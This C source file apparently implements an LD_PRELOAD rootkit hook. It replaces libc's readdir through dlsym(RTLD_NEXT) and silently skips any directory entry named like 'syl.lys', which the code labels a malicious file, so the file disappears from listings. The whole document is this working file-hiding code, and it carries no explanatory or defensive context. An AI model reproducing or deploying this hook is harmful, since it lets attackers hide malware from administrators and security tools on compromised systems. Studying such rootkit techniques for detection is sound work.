#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

#define MALICIOUS_FILE "syl.lys"

struct dirent *(*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) 
{
    struct dirent *ret;
    original_readdir = dlsym(RTLD_NEXT, "readdir");

    while((ret = original_readdir(dirp))) {
        if(strstr(ret->d_name, MALICIOUS_FILE) == 0)
            break;
    }
    return ret;
}